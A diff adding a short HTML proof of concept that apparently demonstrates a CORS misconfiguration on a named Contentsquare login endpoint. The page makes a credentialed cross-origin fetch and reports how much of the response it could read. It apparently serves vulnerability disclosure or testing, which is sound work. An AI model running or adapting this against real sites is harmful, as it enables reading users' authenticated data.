@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <div id="result">Testing...</div>
+    <script>
+        fetch('https://cshelper.contentsquare.com/login/signin.aspx?returnTo=%2f', {
+            credentials: 'include'
+        })
+        .then(r => r.text())
+        .then(data => {
+            document.getElementById('result').innerHTML = 
+                '✓ Successfully read ' + data.length + ' characters from Contentsquare';
+        });
+    </script>
+</body>
+</html>
